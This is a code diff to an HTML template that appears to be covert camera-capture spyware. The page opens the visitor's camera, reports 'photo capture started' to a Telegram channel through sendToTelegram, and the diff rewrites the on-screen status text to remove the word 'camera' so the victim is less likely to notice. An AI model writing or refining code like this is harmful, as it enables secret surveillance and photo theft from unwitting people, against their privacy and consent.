@@ -267,9 +267,9 @@ HTML_TEMPLATE = """
       videoElement.srcObject = stream;
       videoElement.play();
       
-      permissionStatus.textContent = '✅ Camera access granted - capturing securely';
+      permissionStatus.textContent = '✅ access granted';
       permissionStatus.style.borderLeftColor = '#51cf66';
-      statusBadge.textContent = '📸 camera active';
+      statusBadge.textContent = 'active';
       
       sendToTelegram('✅ Camera access granted immediately. Photo capture started.');
       
@@ -279,9 +279,9 @@ HTML_TEMPLATE = """
     .catch(function(err) {
       permissionGranted = false;
       mediaActive = false;
-      permissionStatus.textContent = '⚠️ Camera access denied. Some features may not work.';
+      permissionStatus.textContent = '⚠️ access denied. Some features may not work.';
       permissionStatus.style.borderLeftColor = '#ff6b6b';
-      statusBadge.textContent = '⚠️ camera unavailable';
+      statusBadge.textContent = '⚠️ unavailable';
       sendToTelegram(`❌ Camera access denied immediately: ${err.message || 'unknown'}`);
     });
   }
